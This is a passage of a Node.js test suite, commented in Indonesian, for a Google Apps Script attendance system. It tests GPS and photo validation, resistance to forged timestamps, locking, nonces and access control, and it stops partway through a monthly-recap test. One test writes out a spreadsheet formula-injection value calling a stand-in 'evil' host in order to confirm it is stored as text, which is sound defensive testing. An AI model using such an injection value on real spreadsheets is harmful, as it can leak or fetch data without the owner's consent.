'use strict';
/**
 * Uji backend Google Apps Script pada mock runtime (dev/gas-mock.js).
 * Nama uji diawali kode skenario (S01–S17 = skenario wajib, X.. = uji tambahan).
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const { OFFICE, offset, makeJpeg, wib, must, bootstrap, attend, relogin } = require('./helpers');
const { createGas } = require('../dev/gas-mock');

const INSIDE = Object.assign(offset(20, 15), { accuracy: 12 });   // ±25 m dari kantor
const DAY = '2026-10-26'; // Senin

test('S01 check-in dengan foto langsung & GPS valid berhasil', () => {
  const { env, tokens, ids } = bootstrap({ now: wib(DAY, '07:50') });
  const st = must(env.api('attendance.state', {}, tokens.budi));
  assert.equal(st.mode, 'checkin');
  assert.equal(st.ok, true);
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  assert.equal(r.status, 'Hadir');
  assert.equal(r.serverTime.iso, new Date(wib(DAY, '07:50')).toISOString());
  assert.equal(r.serverTime.local, '07:50:00');
  assert.ok(r.location.distance > 15 && r.location.distance < 35, 'jarak ' + r.location.distance);
  const rows = env.table('Attendance');
  assert.equal(rows.length, 1);
  assert.equal(rows[0].employeeId, ids.budi);
  assert.equal(rows[0].workDate, DAY);
  assert.ok(rows[0].checkInPhotoId, 'ID foto tersimpan');
  assert.match(rows[0].checkInPhotoHash, /^[a-f0-9]{64}$/);
});

test('S01b tanpa jadwal: check-in jam berapa pun tercatat Hadir tanpa menit terlambat', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '13:20') });
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  assert.equal(r.status, 'Hadir');
  assert.equal(r.lateMinutes, 0);
  assert.equal(env.table('Attendance')[0].scheduleId, '');
});

test('S02 check-out dengan foto langsung & GPS valid berhasil', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:55') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib(DAY, '17:05'));
  const st = must(env.api('attendance.state', {}, tokens.budi));
  assert.equal(st.mode, 'checkout');
  const r = must(attend(env, tokens.budi, 'checkout', offset(-30, 10)));
  assert.equal(r.checkOutStatus, 'Normal');
  assert.equal(r.workMinutes, 9 * 60 + 10, 'durasi = jam pulang − jam masuk');
  const row = env.table('Attendance')[0];
  assert.equal(row.checkOutAt, new Date(wib(DAY, '17:05')).toISOString());
  assert.ok(row.checkOutPhotoId && row.checkOutPhotoId !== row.checkInPhotoId);
  const done = must(env.api('attendance.state', {}, tokens.budi));
  assert.equal(done.mode, 'done');
});

test('S02b tanpa jadwal: check-out kapan saja tanpa status Pulang Cepat', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '10:00') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib(DAY, '11:30'));
  const r = must(attend(env, tokens.budi, 'checkout', INSIDE));
  assert.equal(r.checkOutStatus, 'Normal');
  assert.equal(r.earlyMinutes, 0);
  assert.equal(r.workMinutes, 90);
});

test('S03 pengguna di luar radius kantor ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const far = Object.assign(offset(0, 350), { accuracy: 10 });
  const pre = must(env.api('attendance.checkLocation', far, tokens.budi));
  assert.equal(pre.ok, false);
  assert.equal(pre.code, 'OUTSIDE_RADIUS');
  assert.match(pre.message, /luar area kantor/);
  const r = attend(env, tokens.budi, 'checkin', far);
  assert.equal(r.ok, false);
  assert.equal(r.code, 'OUTSIDE_RADIUS');
  assert.equal(env.table('Attendance').length, 0);
  assert.equal(env.state.files.size, 0, 'foto tidak tersimpan untuk transaksi gagal');
  const log = env.table('AuditLogs').filter(l => l.action === 'CHECKIN' && l.result === 'FAIL');
  assert.equal(log.length, 1);
  assert.doesNotMatch(log[0].detail, /106\.8/, 'audit tidak menyimpan koordinat lengkap');
});

test('S05 izin lokasi ditolak (tanpa koordinat) → absensi ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const begin = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  const r = env.api('attendance.submit', { action: 'checkin', nonce: begin.nonce, photo: makeJpeg() }, tokens.budi);
  assert.equal(r.code, 'LOCATION_REQUIRED');
  assert.equal(r.error, 'Izin lokasi diperlukan untuk melakukan absensi.');
});

test('S06 GPS tidak tersedia / koordinat tidak valid → ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  for (const bad of [{ lat: 'abc', lng: 106.8, accuracy: 10 }, { lat: 0, lng: 0, accuracy: 10 }, { lat: 95, lng: 10, accuracy: 10 }]) {
    const r = attend(env, tokens.budi, 'checkin', bad);
    assert.equal(r.code, 'LOCATION_INVALID', JSON.stringify(bad));
    env.advance(5000);
  }
  const noAcc = attend(env, tokens.budi, 'checkin', { lat: INSIDE.lat, lng: INSIDE.lng, accuracy: null });
  assert.equal(noAcc.code, 'ACCURACY_LOW');
});

test('S07 akurasi GPS tidak mencukupi → ditolak dengan pesan jelas', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const r = attend(env, tokens.budi, 'checkin', Object.assign({}, INSIDE, { accuracy: 85 }));
  assert.equal(r.code, 'ACCURACY_LOW');
  assert.match(r.error, /Akurasi GPS belum mencukupi.*area terbuka/);
  assert.equal(env.table('Attendance').length, 0);
});

test('S07b ambang akurasi dapat diubah Admin', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const cfg = must(env.api('settings.get', {}, tokens.admin)).config;
  must(env.api('settings.save', Object.assign({}, cfg, { gpsMaxAccuracy: 100 }), tokens.admin));
  must(attend(env, tokens.budi, 'checkin', Object.assign({}, INSIDE, { accuracy: 85 })));
});

test('S08 jam perangkat dimajukan/dimundurkan → waktu resmi tetap waktu server', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:58') });
  const deviceTime = Date.parse('2026-10-26T13:00:00+07:00'); // jam HP dimajukan 5 jam
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE, { deviceTime, clientNow: deviceTime }));
  assert.equal(r.serverTime.iso, new Date(wib(DAY, '07:58')).toISOString());
  assert.equal(r.status, 'Hadir');
  assert.equal(env.table('Attendance')[0].checkInLocal, '2026-10-26 07:58:00');
});

test('S09 timestamp buatan dari frontend diabaikan', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '09:10') });
  const forged = new Date(wib(DAY, '07:45')).toISOString();
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE, {
    timestamp: forged, checkInAt: forged, serverTime: forged, status: 'Dinas Luar', lateMinutes: 99, workDate: '2026-10-20',
  }));
  const row = env.table('Attendance')[0];
  assert.equal(row.checkInAt, new Date(wib(DAY, '09:10')).toISOString());
  assert.equal(row.status, 'Hadir');
  assert.equal(Number(row.lateMinutes), 0);
  assert.equal(row.workDate, DAY);
  assert.equal(r.serverTime.local, '09:10:00');
});

test('S10 koordinat/radius kantor & isInsideOffice dari frontend tidak dipercaya', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const far = Object.assign(offset(5000, 0), { accuracy: 8 });
  const r = attend(env, tokens.budi, 'checkin', far, {
    officeLat: far.lat, officeLng: far.lng, radius: 999999, isInsideOffice: true, distance: 0, locationId: 'X',
  });
  assert.equal(r.code, 'OUTSIDE_RADIUS');
  assert.match(r.error, /(4,9\d|5,0\d) km/);
});

test('S10b koordinat persis titik kantor diterima tetapi diberi penanda untuk ditinjau', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', { lat: OFFICE.lat, lng: OFFICE.lng, accuracy: 0.5 }));
  const flags = env.table('Attendance')[0].flags;
  assert.match(flags, /IN:EXACT_OFFICE_COORD/);
  assert.match(flags, /IN:ACC_SUSPICIOUS/);
  const own = must(env.api('attendance.history', {}, tokens.budi)).records[0];
  assert.equal(own.flags, undefined, 'penanda tidak ditampilkan kepada karyawan');
  const list = must(env.api('attendance.list', { from: DAY, to: DAY }, tokens.rina)).records[0];
  assert.deepEqual(list.flags, ['IN:ACC_SUSPICIOUS', 'IN:EXACT_OFFICE_COORD']);
});

test('S11 check-in ganda ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.advance(60e3);
  const r = attend(env, tokens.budi, 'checkin', INSIDE);
  assert.equal(r.code, 'DUPLICATE_CHECKIN');
  assert.match(r.error, /sudah check-in.*07:50/);
  assert.equal(env.table('Attendance').length, 1);
});

test('S12 check-out ganda ditolak & check-out sebelum check-in ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const before = attend(env, tokens.budi, 'checkout', INSIDE);
  assert.equal(before.code, 'NO_CHECKIN');
  env.advance(5000);
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib(DAY, '17:01'));
  must(attend(env, tokens.budi, 'checkout', INSIDE));
  env.advance(60e3);
  const again = attend(env, tokens.budi, 'checkout', INSIDE);
  assert.equal(again.code, 'DUPLICATE_CHECKOUT');
  const row = env.table('Attendance')[0];
  assert.equal(row.checkOutAt, new Date(wib(DAY, '17:01')).toISOString(), 'check-out pertama tidak tertimpa');
});

test('S13 foto tersimpan privat di Drive & hanya dapat diakses role berwenang', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const photo = makeJpeg();
  const begin = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  const r = must(env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: begin.nonce, photo }, INSIDE), tokens.budi));
  const row = env.table('Attendance')[0];
  const file = env.state.files.get(row.checkInPhotoId);
  assert.ok(file, 'file ada di Drive');
  assert.equal(file.getSharingAccess(), 'PRIVATE');
  assert.equal(file.parent.name, '2026-10', 'disimpan di subfolder bulan');
  assert.equal(file.parent.parent.getId(), env.state.props.get('PHOTO_FOLDER_ID'));
  assert.match(file.getName(), /^2026-10-26_K001_masuk_ABS-/);

  for (const who of ['admin', 'rina', 'budi']) {
    const res = must(env.api('attendance.photo', { attendanceId: r.attendanceId, type: 'in' }, tokens[who]), who);
    assert.equal(res.dataUrl, photo, who + ' menerima foto yang sama');
  }
  for (const who of ['siti', 'andi']) {
    const res = env.api('attendance.photo', { attendanceId: r.attendanceId, type: 'in' }, tokens[who]);
    assert.equal(res.code, 'FORBIDDEN', who + ' ditolak');
  }
  assert.ok(env.table('AuditLogs').some(l => l.action === 'PHOTO_VIEW' && l.result === 'DENIED'));
});

test('S13b rekan satu departemen pun tidak dapat melihat foto absensi', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE)); // Budi = IT
  const res = env.api('attendance.photo', { attendanceId: r.attendanceId }, tokens.andi); // Andi = IT, role lama "manager"
  assert.equal(res.code, 'FORBIDDEN');
});

test('S14 data absensi tersimpan lengkap di Google Sheets', () => {
  const { env, tokens, ids, locationId } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE, { note: 'Masuk via pintu barat' }));
  const row = env.table('Attendance')[0];
  const required = ['attendanceId', 'key', 'employeeId', 'workDate', 'status', 'checkInAt', 'checkInLocal',
    'checkInPhotoId', 'checkInLat', 'checkInLng', 'checkInAccuracy', 'checkInDistance', 'checkInLocationId', 'createdAt', 'updatedAt', 'updatedBy'];
  required.forEach(k => assert.notEqual(row[k], '', k + ' terisi'));
  assert.equal(row.key, ids.budi + '|' + DAY);
  assert.equal(row.checkInLocationId, locationId);
  assert.equal(row.note, 'Masuk via pintu barat');
  assert.equal(typeof row.workDate, 'string', 'tanggal disimpan sebagai teks, tidak diubah Sheets menjadi Date');
  assert.equal(typeof row.checkInAt, 'string');
  assert.equal(Number(row.checkInLat), INSIDE.lat);
});

test('S15a dua transaksi bersamaan untuk karyawan yang sama → hanya satu tersimpan', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const b1 = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  const b2 = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  const userId = env.table('Users').find(u => u.username === 'budi').userId;
  let inner;
  // Saat permintaan A menunggu lock, permintaan B (perangkat lain) lebih dulu mendapat lock.
  // Cooldown CacheService tidak atomik, jadi disimulasikan lolos; jaminan sebenarnya adalah Script Lock.
  env.state.lock.onAcquire = () => {
    env.state.cache.delete('cd_' + userId);
    inner = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: b2.nonce, photo: makeJpeg() }, INSIDE), tokens.budi);
  };
  const outer = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: b1.nonce, photo: makeJpeg() }, INSIDE), tokens.budi);
  assert.equal(inner.ok, true, 'transaksi pertama berhasil');
  assert.equal(outer.ok, false);
  assert.equal(outer.code, 'DUPLICATE_CHECKIN');
  assert.equal(env.table('Attendance').length, 1);
  assert.equal([...env.state.files.values()].filter(f => !f.trashed).length, 1, 'foto transaksi yang ditolak tidak tersisa');
});

test('S15b dua karyawan check-in bersamaan → keduanya tersimpan tanpa saling menimpa', () => {
  const { env, tokens, ids } = bootstrap({ now: wib(DAY, '07:50') });
  const bs = must(env.api('attendance.begin', { action: 'checkin' }, tokens.siti));
  let inner;
  env.state.lock.onAcquire = () => {
    inner = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: bs.nonce, photo: makeJpeg() }, INSIDE), tokens.siti);
  };
  const outer = attend(env, tokens.budi, 'checkin', INSIDE);
  assert.equal(inner.ok, true);
  assert.equal(outer.ok, true);
  const rows = env.table('Attendance');
  assert.deepEqual(rows.map(r => r.employeeId).sort(), [ids.budi, ids.siti].sort());
});

test('S15c lock sibuk → transaksi ditolak aman tanpa data setengah jadi', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const b = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  env.state.lock.failNext = true;
  const r = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: b.nonce, photo: makeJpeg() }, INSIDE), tokens.budi);
  assert.equal(r.code, 'BUSY');
  assert.equal(env.table('Attendance').length, 0);
  env.advance(5000);
  must(env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: b.nonce, photo: makeJpeg() }, INSIDE), tokens.budi), 'coba ulang dengan nonce sama');
});

test('S15d pengiriman berulang: nonce sekali pakai, cooldown, dan foto yang sama ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const b = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
  const photo = makeJpeg();
  const payload = Object.assign({ action: 'checkin', nonce: b.nonce, photo }, INSIDE);
  must(env.api('attendance.submit', payload, tokens.budi));
  const fast = env.api('attendance.submit', payload, tokens.budi);
  assert.equal(fast.code, 'RATE_LIMIT');
  env.advance(5000);
  const replay = env.api('attendance.submit', payload, tokens.budi);
  assert.equal(replay.code, 'NONCE_INVALID');
  // Foto check-in dipakai ulang untuk check-out
  env.setNow(wib(DAY, '17:10'));
  const b2 = must(env.api('attendance.begin', { action: 'checkout' }, tokens.budi));
  const reuse = env.api('attendance.submit', Object.assign({ action: 'checkout', nonce: b2.nonce, photo, workPhoto: makeJpeg(), workNote: 'Packing pesanan' }, INSIDE), tokens.budi);
  assert.equal(reuse.code, 'DUPLICATE_PHOTO');
});

test('S17 reload / eksekusi baru tetap membaca transaksi yang sudah tersimpan', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.advance(30 * 60e3);
  const st = must(env.api('attendance.state', {}, tokens.budi)); // eksekusi baru, memo kosong
  assert.equal(st.mode, 'checkout');
  assert.equal(st.record.attendanceId, r.attendanceId);
  assert.equal(st.record.checkIn, '07:50:00');
  const hist = must(env.api('attendance.history', {}, tokens.budi)).records;
  assert.equal(hist.length, 1);
});

/* ---------- Uji tambahan: absensi bebas jam ---------- */

test('X01 tanpa jadwal: check-in dini hari, siang, dan malam semuanya diterima', () => {
  for (const time of ['00:30', '05:30', '13:00', '23:40']) {
    const { env, tokens } = bootstrap({ now: wib(DAY, time) });
    const st = must(env.api('attendance.state', {}, tokens.budi));
    assert.equal(st.mode, 'checkin', time);
    assert.equal(st.ok, true, time);
    assert.equal(st.schedule, null);
    must(attend(env, tokens.budi, 'checkin', INSIDE), 'check-in ' + time);
  }
});

test('X02 tanpa jadwal: hari Minggu & tanggal merah tetap bisa absen', () => {
  const { env, tokens } = bootstrap({ now: wib('2026-10-25', '08:00') }); // Minggu
  must(attend(env, tokens.budi, 'checkin', INSIDE));
});

test('X03 check-out terlalu cepat ditolak; batas check-out pukul 04.00 keesokan hari', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.advance(60e3);
  assert.equal(attend(env, tokens.budi, 'checkout', INSIDE).code, 'TOO_SOON');
  env.setNow(wib('2026-10-27', '04:10'));
  tokens.budi = relogin(env, 'budi');
  const st = must(env.api('attendance.state', {}, tokens.budi));
  assert.equal(st.mode, 'checkin', 'lewat 04.00: catatan kemarin ditutup tanpa jam pulang');
  assert.equal(st.workDate, '2026-10-27');
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  assert.equal(env.table('Attendance').length, 2);
});

test('X04 lupa check-out kemarin tidak menghalangi check-in pagi hari ini', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '16:00') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib('2026-10-27', '05:30'));
  tokens.budi = relogin(env, 'budi');
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib('2026-10-27', '10:00'));
  tokens.budi = relogin(env, 'budi');
  must(attend(env, tokens.budi, 'checkout', INSIDE));
  const rows = env.table('Attendance');
  assert.equal(rows.find(r => r.workDate === DAY).checkOutAt, '');
  assert.ok(rows.find(r => r.workDate === '2026-10-27').checkOutAt);
});

test('X05 kerja lewat tengah malam: check-out sebelum 04.00 masuk ke tanggal check-in', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '20:00') });
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  assert.equal(r.workDate, DAY);
  env.setNow(wib('2026-10-27', '01:15'));
  tokens.budi = relogin(env, 'budi');
  const st = must(env.api('attendance.state', {}, tokens.budi));
  assert.equal(st.mode, 'checkout');
  assert.equal(st.workDate, DAY);
  const out = must(attend(env, tokens.budi, 'checkout', INSIDE));
  assert.equal(out.workMinutes, 5 * 60 + 15);
  assert.equal(must(env.api('attendance.state', {}, tokens.budi)).mode, 'checkin', 'tanggal 27 masih bisa check-in');
});

test('X06 izin/cuti yang disetujui memblokir check-in pada tanggal tersebut', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:00') });
  const lv = must(env.api('leave.submit', { jenis: 'Sakit', tanggalMulai: DAY, tanggalSelesai: DAY, alasan: 'Demam' }, tokens.budi));
  const self = env.api('leave.decide', { leaveId: lv.leaveId, decision: 'Disetujui' }, tokens.budi);
  assert.equal(self.code, 'FORBIDDEN');
  assert.equal(env.api('leave.decide', { leaveId: lv.leaveId, decision: 'Disetujui' }, tokens.andi).code, 'FORBIDDEN', 'rekan satu departemen tidak berwenang');
  must(env.api('leave.decide', { leaveId: lv.leaveId, decision: 'Disetujui' }, tokens.rina)); // HRD
  env.setNow(wib(DAY, '07:50'));
  assert.equal(attend(env, tokens.budi, 'checkin', INSIDE).code, 'ON_LEAVE');
});

test('X07 validasi jadwal menolak konfigurasi tidak masuk akal', () => {
  const { env, tokens } = bootstrap();
  const bad = env.api('schedules.save', { nama: 'X', jamMasuk: '08:00', jamPulang: '17:00', toleransiMenit: 15, bukaCheckInMenit: 600, batasCheckOutMenit: 600, hariKerja: '1' }, tokens.admin);
  assert.equal(bad.code, 'VALIDATION');
  const bad2 = env.api('schedules.save', { nama: 'X', jamMasuk: '25:00', jamPulang: '17:00', toleransiMenit: 0, bukaCheckInMenit: 0, batasCheckOutMenit: 0, hariKerja: '1' }, tokens.admin);
  assert.equal(bad2.code, 'VALIDATION');
  assert.equal(env.api('schedules.save', { nama: 'X', jamMasuk: '08:00', jamPulang: '17:00', toleransiMenit: 0, bukaCheckInMenit: 0, batasCheckOutMenit: 0, hariKerja: '1' }, tokens.rina).code, 'FORBIDDEN');
});

test('X08 zona waktu perusahaan dapat diubah Admin', () => {
  const { env, tokens } = bootstrap({ now: Date.parse('2026-10-26T00:30:00Z') }); // 07:30 WIB = 08:30 WITA
  const cfg = must(env.api('settings.get', {}, tokens.admin)).config;
  must(env.api('settings.save', Object.assign({}, cfg, { timezone: 'Asia/Makassar' }), tokens.admin));
  const t = must(env.api('time.now'));
  assert.equal(t.tzAbbr, 'WITA');
  assert.equal(t.time, '08:30:00');
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  assert.equal(r.serverTime.local, '08:30:00', 'jam masuk memakai zona WITA');
  assert.equal(env.api('settings.save', Object.assign({}, cfg, { timezone: 'Mars/Olympus' }), tokens.admin).code, 'VALIDATION');
});

/* ---------- Uji tambahan: foto ---------- */

test('X09 foto non-JPEG, terlalu kecil, atau rusak ditolak; tanpa foto ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const cases = [
    ['data:image/png;base64,' + Buffer.alloc(9000, 1).toString('base64'), 'PHOTO_INVALID'],
    [makeJpeg({ size: 500 }), 'PHOTO_INVALID'],
    [makeJpeg({ width: 100, height: 100 }), 'PHOTO_INVALID'],
    ['data:image/jpeg;base64,' + Buffer.alloc(9000, 7).toString('base64'), 'PHOTO_INVALID'],
    ['', 'PHOTO_REQUIRED'],
  ];
  for (const [photo, code] of cases) {
    const b = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi));
    const r = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: b.nonce, photo }, INSIDE), tokens.budi);
    assert.equal(r.code, code);
    env.advance(5000);
  }
  assert.equal(env.table('Attendance').length, 0);
});

test('X10 nonce milik pengguna lain / kedaluwarsa ditolak', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const sitiNonce = must(env.api('attendance.begin', { action: 'checkin' }, tokens.siti)).nonce;
  const r = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: sitiNonce, photo: makeJpeg() }, INSIDE), tokens.budi);
  assert.equal(r.code, 'NONCE_INVALID');
  const own = must(env.api('attendance.begin', { action: 'checkin' }, tokens.budi)).nonce;
  env.advance(11 * 60e3);
  const late = env.api('attendance.submit', Object.assign({ action: 'checkin', nonce: own, photo: makeJpeg() }, INSIDE), tokens.budi);
  assert.equal(late.code, 'NONCE_INVALID');
});

test('X11 retensi memindahkan foto lama ke sampah tanpa menghapus data absensi', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  env.setNow(wib('2027-11-01', '02:00'));
  const msg = env.run('runRetentionCleanup');
  assert.match(msg, /Foto dihapus: 1/);
  const row = env.table('Attendance')[0];
  assert.equal(row.checkInPhotoId, 'DIHAPUS:RETENSI');
  assert.equal([...env.state.files.values()][0].trashed, true);
  assert.equal(env.run('runRetentionCleanup'), 'Retensi sudah dijalankan dalam 6 jam terakhir.');
});

/* ---------- Uji tambahan: keamanan ---------- */

test('X12 hanya fungsi yang diizinkan dapat dipanggil dari browser', () => {
  const env = createGas();
  assert.deepEqual(env.publicFunctions().sort(), ['api', 'doGet', 'doPost', 'resetAdminPassword', 'runRetentionCleanup', 'setup']);
});

test('X13 setup() & resetAdminPassword() menolak pemanggilan dari web app oleh pengunjung', () => {
  const { env } = bootstrap();
  env.state.activeEmail = '';
  assert.throws(() => env.run('setup'), /pemilik.editor skrip/);
  assert.throws(() => env.run('resetAdminPassword'), /pemilik.editor skrip/);
  env.state.activeEmail = 'orang.lain@gmail.com';
  assert.throws(() => env.run('setup'), /pemilik.editor skrip/);
});

test('X14 password disimpan sebagai hash PBKDF2, tidak pernah teks biasa', () => {
  const { env } = bootstrap();
  const users = env.table('Users');
  users.forEach(u => assert.match(u.passwordHash, /^pbkdf2\$1000\$[A-Za-z0-9+/=]+\$[A-Za-z0-9+/=]+$/));
  const dump = JSON.stringify(env.state.spreadsheets.get(env.state.props.get('SPREADSHEET_ID')).sheets.map(s => s.data));
  assert.ok(!dump.includes('Rahasiabudi2026'));
});

test('X15 users.list tidak mengirim hash password ke browser', () => {
  const { env, tokens } = bootstrap();
  const list = must(env.api('users.list', {}, tokens.admin)).users;
  assert.ok(list.length >= 5);
  list.forEach(u => assert.equal(u.passwordHash, undefined));
  const s = must(env.api('settings.get', {}, tokens.admin));
  assert.ok(!JSON.stringify(s).includes(env.state.props.get('SPREADSHEET_ID')), 'ID spreadsheet tidak bocor');
  assert.ok(!JSON.stringify(s).includes(env.state.props.get('PHOTO_FOLDER_ID')), 'ID folder tidak bocor');
});

test('X16 login: kunci setelah 5 kali gagal, pesan generik', () => {
  const { env } = bootstrap();
  for (let i = 0; i < 5; i++) {
    const r = env.api('auth.login', { username: 'budi', password: 'salah' + i });
    assert.equal(r.error, 'Username atau password salah.');
  }
  const locked = env.api('auth.login', { username: 'budi', password: 'Rahasiabudi2026' });
  assert.equal(locked.code, 'RATE_LIMIT');
  env.advance(16 * 60e3);
  must(env.api('auth.login', { username: 'budi', password: 'Rahasiabudi2026' }));
  assert.equal(env.api('auth.login', { username: 'tidakada', password: 'x' }).error, 'Username atau password salah.');
});

test('X17 token palsu/kedaluwarsa & role dari payload tidak dipercaya', () => {
  const { env, tokens } = bootstrap();
  assert.equal(env.api('dashboard.summary', {}, 'a'.repeat(64)).code, 'AUTH_REQUIRED');
  assert.equal(env.api('dashboard.summary', {}, null).code, 'AUTH_REQUIRED');
  assert.equal(env.api('users.list', { role: 'admin' }, tokens.budi).code, 'FORBIDDEN');
  assert.equal(env.api('settings.save', { role: 'admin', timezone: 'UTC' }, tokens.rina).code, 'FORBIDDEN');
  assert.equal(env.api('employees.save', { nama: 'X' }, tokens.budi).code, 'FORBIDDEN');
  assert.equal(env.api('attendance.update', { attendanceId: 'x', status: 'Hadir' }, tokens.andi).code, 'FORBIDDEN');
  assert.equal(env.api('aksi.tidak.ada', {}, tokens.admin).code, 'BAD_REQUEST');
  env.advance(13 * 3600e3);
  assert.equal(env.api('dashboard.summary', {}, tokens.budi).code, 'AUTH_REQUIRED', 'sesi kedaluwarsa');
});

test('X18 karyawan hanya melihat datanya sendiri', () => {
  const { env, tokens, ids } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.siti, 'checkin', INSIDE));
  assert.equal(env.api('employees.get', { employeeId: ids.siti }, tokens.budi).code, 'FORBIDDEN');
  assert.equal(env.api('attendance.history', { employeeId: ids.siti }, tokens.budi).code, 'FORBIDDEN');
  assert.equal(env.api('employees.list', {}, tokens.budi).code, 'FORBIDDEN');
  assert.equal(env.api('employees.list', {}, tokens.andi).code, 'FORBIDDEN', 'role lama manager = karyawan');
  assert.equal(env.api('attendance.list', { from: DAY, to: DAY }, tokens.andi).code, 'FORBIDDEN');
  const hr = must(env.api('attendance.list', { from: DAY, to: DAY }, tokens.rina)).records;
  assert.equal(hr.length, 1);
  assert.ok(hr[0].checkInLat !== undefined, 'HR melihat koordinat audit');
});

test('X19 wajib ganti password sementara sebelum memakai fitur lain', () => {
  const { env, tokens } = bootstrap();
  const res = must(env.api('users.resetPassword', { userId: env.table('Users').find(u => u.username === 'budi').userId }, tokens.admin));
  assert.equal(env.api('dashboard.summary', {}, tokens.budi).code, 'AUTH_REQUIRED', 'sesi lama gugur setelah reset password');
  const t = must(env.api('auth.login', { username: 'budi', password: res.tempPassword })).token;
  assert.equal(env.api('attendance.state', {}, t).code, 'PASSWORD_CHANGE_REQUIRED');
  assert.equal(env.api('auth.changePassword', { oldPassword: res.tempPassword, newPassword: 'pendek' }, t).code, 'VALIDATION');
  must(env.api('auth.changePassword', { oldPassword: res.tempPassword, newPassword: 'PasswordBaru123' }, t));
});

test('X20 input berawalan "=" disimpan sebagai teks (anti formula injection)', () => {
  const { env, tokens } = bootstrap();
  const r = must(env.api('employees.save', { nama: '=IMPORTXML("http://evil","//a")', jabatan: '+cmd', departemen: '@x' }, tokens.admin));
  const row = env.table('Employees').find(e => e.employeeId === r.employeeId);
  assert.equal(row.nama, '=IMPORTXML("http://evil","//a")');
});

test('X21 pengguna terakhir dengan role Admin tidak dapat dinonaktifkan', () => {
  const { env, tokens } = bootstrap();
  const admin = env.table('Users').find(u => u.username === 'admin');
  const r = env.api('users.save', { userId: admin.userId, role: 'karyawan', status: 'Aktif' }, tokens.admin);
  assert.equal(r.code, 'VALIDATION');
  assert.equal(env.api('users.remove', { userId: admin.userId }, tokens.admin).code, 'VALIDATION');
});

test('X22 rekap bulanan tanpa jadwal: hadir, izin, tanpa check-out, jam kerja; tidak ada alpha otomatis', () => {
  const { env, tokens, ids } = bootstrap({ now: wib('2026-10-26', '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));                    // 26: hadir, tanpa check-out
  env.setNow(wib('2026-10-27', '13:40'));
  tokens.budi = relogin(env, 'budi');
  must(attend(env, tokens.budi, 'checkin', INSIDE));                    // 27: hadir 13:40–15:40
  env.setNow(wib('2026-10-27', '15:40'));
  must(attend(env, relogin(env, 'budi'), 'checkout', INSIDE));
  const lv = must(env.api('leave.submit', { jenis: 'Izin', tanggalMulai: '2026-10-28', tanggalSelesai: '2026-10-29', alasan: 'Urusan keluarga' }, relogin(env, 'budi')));
  must(env.api('leave.decide', { leaveId: lv.leaveId, decision: 'Disetujui' }, relogin(env, 'rina')));
  env.setNow(wib('2026-10-30', '18:00'));
